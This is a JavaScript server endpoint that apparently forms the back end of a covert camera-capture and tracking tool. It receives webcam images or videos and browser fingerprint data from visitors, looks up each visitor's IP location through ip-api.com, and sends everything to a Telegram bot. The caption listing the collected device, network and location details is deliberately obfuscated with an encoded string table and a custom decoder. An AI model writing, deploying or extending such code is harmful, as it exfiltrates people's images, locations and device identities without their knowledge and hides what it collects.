import fs from 'fs';
import path from 'path';

export default async function handler(req, res) {
    if (req.method !== 'POST') return res.status(405).json({ error: 'Method not allowed' });

    const { type, image, video, mimeType, fingerprint, videoIndex } = req.body;
    if (!type) return res.status(400).json({ error: 'Missing type' });
    if (type === 'image' && !image) return res.status(400).json({ error: 'No image' });
    if (type === 'video' && !video) return res.status(400).json({ error: 'No video' });

    let BOT_TOKEN = process.env.BOT_TOKEN;
    let CHAT_ID = process.env.CHAT_ID;

    if (!BOT_TOKEN || !CHAT_ID) {
        try {
            const root = process.cwd();
            BOT_TOKEN = fs.readFileSync(path.join(root, 'token.txt'), 'utf8').trim();
            CHAT_ID = fs.readFileSync(path.join(root, 'uid.txt'), 'utf8').trim();
        } catch (e) {
            return res.status(500).json({ error: 'Bot config missing: ' + e.message });
        }
    }

    const ip = req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';

    let geo = {};
    try {
        const geoRes = await fetch(`http://ip-api.com/json/${ip}?fields=status,country,city,isp,org,as,query`);
        geo = await geoRes.json();
    } catch (e) {
        geo = { status: 'fail', country: 'Unknown', city: 'Unknown', isp: 'Unknown' };
    }

    const f = fingerprint || {};
    const videoLabel = videoIndex !== undefined ? ` (Video ${videoIndex+1})` : '';

   var eWbjIRg,fD2BLOg,EXaXpFs,P3MZqU,U09Es0,pgBOKde,Ug80JrP,DLBNtx;const f77xah=[0x0,0x1,0x8,0xff,"length",0x3f,0x6,"fromCodePoint",0x7,0xc,"push","undefined","\n",0x1b,0x1b1,0x9,0x4,0xe,0xf6,0x44,0xa,0x164,0x23c,0xb,")\n",0x1f,0x300,0x35d,0x1e,0xd,0x394,", ",0x3eb,0x1a,0x426," (",0xf,")",0x12,0x19,0x15];function uUmRVBY(eWbjIRg){var fD2BLOg="\"K^8b=,6WkuB<!ASgrHdt3v`Fe#pZLCU}_>X(Yc4qa7zQI~/P9V$M?f1yE|J.T0Rxh%{m:5)G&@ln;2[o+sOjD*N]wi",EXaXpFs,P3MZqU,U09Es0,pgBOKde,Ug80JrP,DLBNtx,uUmRVBY;QclpkL(EXaXpFs=""+(eWbjIRg||""),P3MZqU=EXaXpFs.length,U09Es0=[],pgBOKde=f77xah[0x0],Ug80JrP=f77xah[0x0],DLBNtx=-f77xah[0x1]);for(uUmRVBY=f77xah[0x0];uUmRVBY<P3MZqU;uUmRVBY++){var T4OBgaS=fD2BLOg.indexOf(EXaXpFs[uUmRVBY]);if(T4OBgaS===-f77xah[0x1])continue;if(DLBNtx<f77xah[0x0]){DLBNtx=T4OBgaS}else{QclpkL(DLBNtx+=T4OBgaS*0x5b,pgBOKde|=DLBNtx<<Ug80JrP,Ug80JrP+=(DLBNtx&0x1fff)>0x58?f77xah[0x1d]:f77xah[0x11]);do{QclpkL(U09Es0.push(pgBOKde&f77xah[0x3]),pgBOKde>>=f77xah[0x2],Ug80JrP-=f77xah[0x2])}while(Ug80JrP>f77xah[0x8]);DLBNtx=-f77xah[0x1]}}if(DLBNtx>-f77xah[0x1]){U09Es0.push((pgBOKde|DLBNtx<<Ug80JrP)&f77xah[0x3])}return f_Zdua(U09Es0)}function T4OBgaS(fD2BLOg,EXaXpFs){return uUmRVBY(eWbjIRg.slice(fD2BLOg,fD2BLOg+EXaXpFs))}eWbjIRg="h6bOE&|E|*Zz4D=q#i=e|=&s%yA~6+Bb.!C`oo?d:D3xg9PyHcI&#:Hbva#K@,\"$iKGWeOoS~_4t41z*u\"$>qkwFC\"\"56j4[EC)`salCLhXF}4qM|;=1YpVSow_pxV(\"x+fF`He_&Ko?!s:2ybS?G9p}X+q|K%rtb@;Y@VY}:SR#p6Rx39>2TTuErvThP_8:>))LOg3;wzX*vM<]u76n81`%IOLsE8:pWmNYK8K0y#CUU2\"zl(xdurm|(y0AkAr)PPGrJ[qbOduKQp)v>LHZ}Mb6fXe:+Wl4t^]f$Im|(y0AkAr)PPGrJ[qbj\"Xa;wwEDvM<]uxyYG.XY[A9[zx\"^02j{`&fC)\"xgcvw=z%=zw;w}<svM<w1svM/1gzDl^G:*FlrU.273nE5ioGKc!UX;wzX+vM<]uP%ySjq}zhf}7#<]ug@4#zC1o+!?6CZ,Y#{}Cfat;Lqaf_2X+,,o<LMHz1fok:z+_p`f=6[JZxcx];;bCx@);w{X/2a]h=APm/1Xy#vU,ahD`r}I\"I]i>$W=GR!vds|T3P/;w(oK`M<]uR5.Ofqm$<=t_jo.=9G{fj?^~(CYd|3>pe~8}[+\")E!I;wwEK`M<w109#TJX}@&Gb:_K^G+{{xk$}Z)c^j%$A.8v2v&WQoeK^^Twu~=u5nJ>;w=![vM<w1:5+.@cWb{}}20|f16P{^b`\"02$5U|;gWzh0%;bi&$;w!!svM<]u<|,T8z1qj?}7#<]ugk92Y%f#B}6*d+lrcKT#+2vQ6}/\"6@kH/nU)V^NiyY5WElK+8qA8MumN*^\"CGWGfU)G|f16P{^biV~FH4<#z$}A+\"?8EFwr[5B[;^W:~@@0x%eg$t27|?Tv\"Mh_FS<;zo.^1v<8xbtl=>916m.kv;wwE\"`M<w1z%_G.X}E)n.;GmpWmNYK#zhfC)0FVRZhKQ}8Tir~Us:r?lh0ZC=TXM,#:#pz~1`n6+oH?@j(|Wr+\"wmb}0k=;w9EwvM<w1+v`#g3!,Q=WlS>SSn3n\"Pcbz\"LSxkZ)|Cut~qV`vm8;wMoovM<]u)~BVTX?)<=t_jo.=LigN+83u})!?6?~M`Z{<`SO}3n\"b;Cf`M?mG6+gHeYnv`M?mG6+gH|~|j}6=z3uh:O6Bh3|yO<HG;wMoOvM<]uIM:.tqLS,1}7#<]ugWmA85>DwLS~Uao|Cut,3s,#$}s:V^S;wpXc2a]h=AP`58Y@h(;zo@|f16P{^b`c\"y#4nW[R!zt<e?vT!l;waE]vM<w1z%Jc,Y$f<=t_jo.=ydih$#zZ;<@kdd<^/C9.XkKyG~LT^!qM?tn%F,<0|CN,#J}r:~CJr#;w}<svM<w1<hKglc`@&Gb:_K^j1q8}J;t^5m2v,bS!ui):j~;wk+]vM<]u,td#g3!,Q=Wx_0E<pzY@o+k!!0^TK;wA|svM<w1)~*9paLSn?}7#<]ugXd`Q^=zz3@j:J:n0f&eglc<K?l;wbowvM<w1P%#TPt27|?Tv#HU3?MGO$qP#X}ao\"XRLx3d2Al5RmJtxZ40iJoVDJcsCs6gcD4yH7As5g6SqBpilLlJOencyLs3CugFrTY2ijLWCDGA4finFEqgGTVPcgsNcjFdXDLTGb7UPJqSTkOTvuTP6byLh0VrpeUr3zBMI28OcarCgSn8jFQMk2tWBPj2NPy2a3TjIfbEidrULzPNHFBWdwtKpnsO67tsTR3FMzHz9IfrZjx7GAPLDPGIqgjU0MrOgqEmZHIPlXDm2G3";function rx1kqMK(){var eWbjIRg=[function(){return globalThis},function(){return global},function(){return window},function(){return new Function("return this")()}],fD2BLOg,EXaXpFs,P3MZqU;QclpkL(fD2BLOg=void 0x0,EXaXpFs=[]);try{QclpkL(fD2BLOg=Object,EXaXpFs[f77xah[0xa]]("".__proto__.constructor.name))}catch(e){}GAIJcO:for(P3MZqU=f77xah[0x0];P3MZqU<eWbjIRg[f77xah[0x4]];P3MZqU++)try{var U09Es0;fD2BLOg=eWbjIRg[P3MZqU]();for(U09Es0=f77xah[0x0];U09Es0<EXaXpFs[f77xah[0x4]];U09Es0++)if(typeof fD2BLOg[EXaXpFs[U09Es0]]===f77xah[0xb])continue GAIJcO;return fD2BLOg}catch(e){}return fD2BLOg||this}QclpkL(fD2BLOg=rx1kqMK()||{},EXaXpFs=fD2BLOg.TextDecoder,P3MZqU=fD2BLOg.Uint8Array,U09Es0=fD2BLOg.Buffer,pgBOKde=fD2BLOg.String||String,Ug80JrP=fD2BLOg.Array||Array,DLBNtx=function(){var eWbjIRg=new Ug80JrP(0x80),fD2BLOg,EXaXpFs;QclpkL(fD2BLOg=pgBOKde[f77xah[0x7]]||pgBOKde.fromCharCode,EXaXpFs=[]);return function(P3MZqU){var U09Es0,Ug80JrP,DLBNtx,uUmRVBY;QclpkL(Ug80JrP=void 0x0,DLBNtx=P3MZqU[f77xah[0x4]],EXaXpFs[f77xah[0x4]]=f77xah[0x0]);for(uUmRVBY=f77xah[0x0];uUmRVBY<DLBNtx;){QclpkL(Ug80JrP=P3MZqU[uUmRVBY++],Ug80JrP<=0x7f?U09Es0=Ug80JrP:Ug80JrP<=0xdf?U09Es0=(Ug80JrP&f77xah[0x19])<<f77xah[0x6]|P3MZqU[uUmRVBY++]&f77xah[0x5]:Ug80JrP<=0xef?U09Es0=(Ug80JrP&f77xah[0x24])<<f77xah[0x9]|(P3MZqU[uUmRVBY++]&f77xah[0x5])<<f77xah[0x6]|P3MZqU[uUmRVBY++]&f77xah[0x5]:pgBOKde[f77xah[0x7]]?U09Es0=(Ug80JrP&f77xah[0x8])<<f77xah[0x26]|(P3MZqU[uUmRVBY++]&f77xah[0x5])<<f77xah[0x9]|(P3MZqU[uUmRVBY++]&f77xah[0x5])<<f77xah[0x6]|P3MZqU[uUmRVBY++]&f77xah[0x5]:(U09Es0=f77xah[0x5],uUmRVBY+=0x3),EXaXpFs[f77xah[0xa]](eWbjIRg[U09Es0]||(eWbjIRg[U09Es0]=fD2BLOg(U09Es0))))}return EXaXpFs.join("")}}());function f_Zdua(eWbjIRg){return typeof EXaXpFs!==f77xah[0xb]&&EXaXpFs?new EXaXpFs().decode(new P3MZqU(eWbjIRg)):typeof U09Es0!==f77xah[0xb]&&U09Es0?U09Es0.from(eWbjIRg).toString("utf-8"):DLBNtx(eWbjIRg)}function olhxtW6(){}function QclpkL(){QclpkL=function(){}}T4OBgaS(0xc7,f77xah[0x1c])+(type===T4OBgaS(0xe8,f77xah[0x8])?"\uD83C\uDFA5":"\uD83D\uDCF8")+videoLabel+f77xah[0xc]+T4OBgaS(f77xah[0x12],f77xah[0x13])+(T4OBgaS(0x13c,0x18)+(f[T4OBgaS(0x158,f77xah[0x8])]||T4OBgaS(f77xah[0x15],f77xah[0x10]))+f77xah[0xc])+(T4OBgaS(0x16a,f77xah[0xd])+ip+T4OBgaS(0x186,f77xah[0x14]))+(T4OBgaS(0x194,f77xah[0xd])+(geo[T4OBgaS(f77xah[0xe],f77xah[0xf])]?""+geo[T4OBgaS(f77xah[0xe],f77xah[0xf])]+f77xah[0x1f]+geo[T4OBgaS(0x1bd,0x5)]:T4OBgaS(0x1c6,f77xah[0xf]))+f77xah[0x23]+(geo[T4OBgaS(0x1d6,f77xah[0x10])]||T4OBgaS(0x1df,f77xah[0x11]))+f77xah[0x18])+T4OBgaS(f77xah[0x12],f77xah[0x13])+(T4OBgaS(0x1f1,0x1d)+(f[T4OBgaS(0x210,f77xah[0x14])]||T4OBgaS(f77xah[0x15],f77xah[0x10]))+f77xah[0xc])+(T4OBgaS(0x220,f77xah[0x21])+(f[T4OBgaS(f77xah[0x16],f77xah[0x17])]?f[T4OBgaS(f77xah[0x16],f77xah[0x17])][T4OBgaS(0x24a,f77xah[0x8])](") ")[f77xah[0x0]]+f77xah[0x25]:T4OBgaS(f77xah[0x15],f77xah[0x10]))+f77xah[0xc])+(T4OBgaS(0x255,f77xah[0x27])+(f[T4OBgaS(0x272,f77xah[0x2])]||T4OBgaS(f77xah[0x15],f77xah[0x10]))+T4OBgaS(0x281,f77xah[0xf])+(f[T4OBgaS(0x28d,f77xah[0x10])]||"1")+f77xah[0x18])+(T4OBgaS(0x295,f77xah[0x19])+(f[T4OBgaS(0x2b7,f77xah[0x11])]||T4OBgaS(f77xah[0x15],f77xah[0x10]))+f77xah[0xc])+(T4OBgaS(0x2c8,f77xah[0xd])+(f[T4OBgaS(0x2e8,f77xah[0x14])]||T4OBgaS(f77xah[0x15],f77xah[0x10]))+T4OBgaS(0x2f7,f77xah[0x8])+(f[T4OBgaS(f77xah[0x1a],f77xah[0x2])]?f[T4OBgaS(f77xah[0x1a],f77xah[0x2])]/0x3c:"?")+f77xah[0x18])+(T4OBgaS(0x30e,f77xah[0x19])+(f[T4OBgaS(0x334,f77xah[0x8])]||T4OBgaS(f77xah[0x15],f77xah[0x10]))+T4OBgaS(0x343,0x17)+(f[T4OBgaS(f77xah[0x1b],f77xah[0x2])]?f[T4OBgaS(f77xah[0x1b],f77xah[0x2])]+T4OBgaS(0x36a,f77xah[0x10]):T4OBgaS(f77xah[0x15],f77xah[0x10]))+f77xah[0xc])+(T4OBgaS(0x376,f77xah[0x1c])+(f[T4OBgaS(f77xah[0x1e],f77xah[0x1d])]?""+f[T4OBgaS(f77xah[0x1e],f77xah[0x1d])][T4OBgaS(0x3a5,0x10)]+f77xah[0x1f]+f[T4OBgaS(f77xah[0x1e],f77xah[0x1d])][T4OBgaS(0x3ba,f77xah[0x14])]+T4OBgaS(0x3c6,f77xah[0x8]):T4OBgaS(f77xah[0x15],f77xah[0x10]))+f77xah[0xc])+(T4OBgaS(0x3d4,f77xah[0x28])+(f[T4OBgaS(f77xah[0x20],f77xah[0x8])]?f[T4OBgaS(f77xah[0x20],f77xah[0x8])][T4OBgaS(0x3f7,f77xah[0x14])]:T4OBgaS(f77xah[0x15],f77xah[0x10]))+f77xah[0xc])+(T4OBgaS(0x408,f77xah[0x21])+(f[T4OBgaS(f77xah[0x22],f77xah[0xf])]?""+f[T4OBgaS(f77xah[0x22],f77xah[0xf])][T4OBgaS(0x436,f77xah[0x8])]+f77xah[0x23]+(f[T4OBgaS(f77xah[0x22],f77xah[0xf])][T4OBgaS(0x440,f77xah[0x14])]?T4OBgaS(0x44d,f77xah[0x14]):T4OBgaS(0x45d,f77xah[0x24]))+f77xah[0x25]:T4OBgaS(f77xah[0x15],f77xah[0x10]))+f77xah[0xc])+(T4OBgaS(0x46e,f77xah[0xd])+(f[T4OBgaS(0x491,f77xah[0x14])]||T4OBgaS(0x49e,f77xah[0x2]))+f77xah[0xc])+(T4OBgaS(0x4a7,f77xah[0x19])+(f[T4OBgaS(0x4c9,f77xah[0x14])]||T4OBgaS(f77xah[0x15],f77xah[0x10]))+f77xah[0xc])+(T4OBgaS(0x4da,f77xah[0x21])+(f[T4OBgaS(0x4f9,f77xah[0x26])]?T4OBgaS(0x511,f77xah[0xf]):T4OBgaS(0x51f,f77xah[0x14]))+f77xah[0xc])+(T4OBgaS(0x52a,f77xah[0x27])+(f[T4OBgaS(0x544,f77xah[0x2])]?T4OBgaS(0x551,f77xah[0x10]):"No")+f77xah[0xc])+(T4OBgaS(0x55a,f77xah[0x28])+(f[T4OBgaS(0x574,f77xah[0x1d])]||T4OBgaS(f77xah[0x15],f77xah[0x10]))+f77xah[0xc])+T4OBgaS(f77xah[0x12],f77xah[0x13])+(T4OBgaS(0x581,f77xah[0xd])+new Date()[T4OBgaS(0x5a2,f77xah[0x26])]()+f77xah[0xc])+T4OBgaS(f77xah[0x12],f77xah[0x13])+T4OBgaS(0x5b6,0x27);
   

    let form = new FormData();
    form.append('chat_id', CHAT_ID);
    form.append('caption', caption);
    form.append('parse_mode', 'HTML'); 

    if (type === 'image') {
        const buffer = Buffer.from(image.replace(/^data:image\/\w+;base64,/, ''), 'base64');
        form.append('photo', new Blob([buffer], { type: 'image/jpeg' }), 'capture.jpg');
    } else if (type === 'video') {
        const buffer = Buffer.from(video, 'base64');
        const ext = mimeType === 'video/mp4' ? 'mp4' : 'webm';
        form.append('video', new Blob([buffer], { type: mimeType }), `capture_${videoIndex}.${ext}`);
    }

    try {
        const endpoint = type === 'image'
            ? `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`
            : `https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`;

        const response = await fetch(endpoint, { method: 'POST', body: form });
        const data = await response.json();

        if (!response.ok) {
            console.error('Telegram error:', data);
            return res.status(500).json({ error: `Telegram: ${data.description}` });
        }

        res.status(200).json({ status: 'ok' });
    } catch (error) {
        console.error('Server error:', error);
        res.status(500).json({ error: error.message });
    }
}
